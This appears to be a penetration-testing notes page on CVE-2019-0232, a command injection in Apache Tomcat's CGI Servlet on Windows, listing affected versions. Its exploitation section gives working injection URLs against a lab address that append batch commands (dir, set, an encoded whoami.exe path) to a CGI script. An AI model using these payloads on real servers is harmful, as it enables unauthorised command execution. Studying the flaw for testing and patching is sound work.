---
icon: cat
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# CVE-2019-0232 - CGI RCE

`CVE-2019-0232` is a critical security issue that could result in remote code execution. This vulnerability affects Windows systems that have the `enableCmdLineArguments` feature enabled.

An attacker can exploit this vulnerability by exploiting a command injection flaw resulting from a Tomcat CGI Servlet input validation error, thus allowing them to execute arbitrary commands on the affected system.

Versions `9.0.0.M1` to `9.0.17`, `8.5.0` to `8.5.39`, and `7.0.0` to `7.0.93` of Tomcat are affected.

## Exploitation

After finding a CGI to exploit (see [#finding-cgi-scripts](../../../../intelligence/application-enumeration/tomcat-enumeration.md#finding-cgi-scripts "mention")), we can exploit `CVE-2019-0232` by appending our own commands through the use of the batch command separator `&`.

{% code title="HTTP Request from browser" %}
```http
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```
{% endcode %}

This URL returns the output for the `dir` batch command, however trying to run other common windows command line apps, such as `whoami` might not return an output.

Retrieve a list of environmental variables by calling the `set` command:

{% code title="HTTP Request from browser" %}
```http
http://10.129.204.227:8080/cgi/welcome.bat?&set
```
{% endcode %}

From the list, we can see that the `PATH` variable has been unset, so we will need to hardcode paths in requests:

{% code title="HTTP Request from browser" %}
```http
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```
{% endcode %}

Ensure that the URLs are properly encoded.
